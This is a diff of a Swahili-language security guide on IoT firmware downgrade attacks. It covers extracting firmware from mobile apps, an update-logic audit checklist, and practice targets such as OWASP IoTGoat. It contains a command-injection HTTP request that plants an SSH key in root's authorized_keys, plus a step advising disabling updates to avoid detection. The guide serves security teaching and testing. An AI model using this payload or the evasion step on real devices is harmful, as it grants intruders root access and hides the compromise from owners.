+* Vifaa vingi vya watumiaji vya IoT vinaweka wazi endpoints za HTTP(S) *unauthenticated* ambazo zinakubali blobs za firmware zilizopakwa Base64, kuzichanganya upande wa server na kuchochea recovery/upgrade.
+3. Baada ya downgrade, tumia udhaifu uliorekebishwa katika toleo jipya (kwa mfano chujio la command-injection lililoongezwa baadaye).
+4. Kwa hiari, flasha tena picha ya hivi karibuni au zima masasisho ili kuepuka kugunduliwa mara uthabiti unapopatikana.
 
-### Mfano: Command Injection After Downgrade
+### Mfano: Command Injection Baada ya Kupunguza Toleo
 ```http
 POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
 Host: 192.168.0.1
 Content-Type: application/octet-stream
 Content-Length: 0
 ```
-Katika firmware iliyokuwa hatarini (iliyoshushwa kiwango), parameter ya `md5` imeunganishwa moja kwa moja ndani ya amri ya shell bila kusafishwa, ikiruhusu kuingizwa kwa amri yoyote (hapa – kuwezesha ufikiaji wa root kwa kutumia SSH key). Matoleo ya firmware ya baadaye yaliweka kichujio rahisi cha tabia za herufi, lakini ukosefu wa ulinzi dhidi ya kushusha daraja (downgrade protection) unafanya marekebisho hayo yasiwe na tija.
+Katika firmware iliyo na udhaifu (iliyopunguzwa), parameter `md5` inachanganywa moja kwa moja ndani ya shell command bila kusafishwa, ikiruhusu injection ya amri zozote (hapa – kuwezesha SSH key-based root access). Toleo za baadaye za firmware zilileta filter ya msingi ya herufi, lakini kukosekana kwa ulinzi dhidi ya kurejeshwa kwa toleo la zamani kunafanya suluhisho hilo kutokuwa na maana.
 
-### Kuchukua Firmware Kutoka kwa Programu za Simu
+### Kutoa Firmware Kutoka kwa Apps za Mkononi
 
-Wauzaji wengi hujumuisha picha kamili za firmware ndani ya programu zao za kuambatana za simu ili programu iweze kusasisha kifaa kupitia Bluetooth/Wi-Fi. Paketi hizi mara nyingi huhifadhiwa bila kusimbwa ndani ya APK/APEX chini ya njia kama `assets/fw/` au `res/raw/`. Zana kama `apktool`, `ghidra`, au hata `unzip` rahisi zinakuwezesha kutoa images zilizosainiwa bila kugusa vifaa vya kimwili.
+Wauzaji wengi wanahifadhi picha kamili za firmware ndani ya aplikasi zao za mwenzake za mkononi ili programu iweze kusasisha kifaa kupitia Bluetooth/Wi-Fi. Paket hizi kwa kawaida zinahifadhiwa bila kusimbwa ndani ya APK/APEX chini ya njia kama `assets/fw/` au `res/raw/`. Zana kama `apktool`, `ghidra`, au hata `unzip` rahisi zinakuwezesha kutoa image zilizotiwa saini bila kugusa vifaa vya kimwili.
 ```
 $ apktool d vendor-app.apk -o vendor-app
 $ ls vendor-app/assets/firmware
 firmware_v1.3.11.490_signed.bin
 ```
-### Orodha ya Kukagua Mantiki ya Sasisho
+### Orodha ya Kutathmini Mantiki ya Sasisho
 
-* Je, transport/authentication ya *update endpoint* imehifadhiwa vya kutosha (TLS + authentication)?
-* Je, kifaa kinalinganisha **version numbers** au **monotonic anti-rollback counter** kabla ya flashing?
-* Je, image imethibitishwa ndani ya secure boot chain (kwa mfano signatures checked by ROM code)?
-* Je, userland code inafanya sanity checks za ziada (kwa mfano allowed partition map, model number)?
-* Je, *partial* au *backup* update flows zinaendelea kutumia validation logic ile ile?
+* Je, usafirishaji/uthibitishaji wa *update endpoint* umehifadhiwa vyema (TLS + authentication)?
+* Je, kifaa kinalinganisha **nambari za toleo** au **monotonic anti-rollback counter** kabla ya ku-flash?
+* Je, image inathibitishwa ndani ya mnyororo wa secure boot (mf. signatures zinakaguliwa na ROM code)?
+* Je, userland code inafanya ukaguzi wa ziada wa sanity (mf. allowed partition map, model number)?
+* Je, mtiririko wa masasisho ya *partial* au *backup* unatumia tena mantiki ile ile ya uthibitishaji?
 
-> 💡  Ikiwa chochote kati ya hapo juu kinakosekana, jukwaa linaweza kuwa hatarini kwa rollback attacks.
+> 💡  Ikiwa yoyote ya mambo hapo juu inakosa, jukwaa linaweza kuwa hatarini kwa rollback attacks.
 
-## Firmware zilizo hatarini kwa mazoezi
+## Firmware zenye udhaifu za kufanya mazoezi
 
-Ili kufanya mazoezi ya kugundua udhaifu katika firmware, tumia miradi ya firmware zifuatazo zilizo hatarini kama mwanzo.
+Ili kufanya mazoezi ya kugundua udhaifu katika firmware, tumia miradi ifuatayo ya firmware zenye udhaifu kama msingi.
 
 - OWASP IoTGoat
 - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
